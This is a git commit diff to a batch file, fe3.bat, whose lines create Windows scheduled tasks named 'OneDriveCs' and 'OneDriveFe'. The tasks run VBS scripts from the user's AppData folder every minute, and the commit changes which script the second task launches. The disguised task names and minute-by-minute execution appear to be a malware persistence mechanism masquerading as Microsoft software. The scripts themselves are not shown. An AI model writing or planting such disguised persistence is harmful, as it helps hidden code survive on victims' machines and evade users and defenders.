a593046f51bcbd2dd98837b1b060498a884ddd75
Fevzi Eser <59337397+seition2@users.noreply.github.com>
2022-02-27 01:06:18 +0300

    Update fe3.bat

--- fe3.bat
+++ fe3.bat
@@ -1,2 +1,2 @@
 schtasks /create /tn "OneDriveCs" /sc minute /mo 1 /tr "%appdata%\system2.vbs"
-schtasks /create /tn "OneDriveFe" /sc minute /mo 1 /tr "%appdata%\system2.vbs"
+schtasks /create /tn "OneDriveFe" /sc minute /mo 1 /tr "%appdata%\system3.vbs"
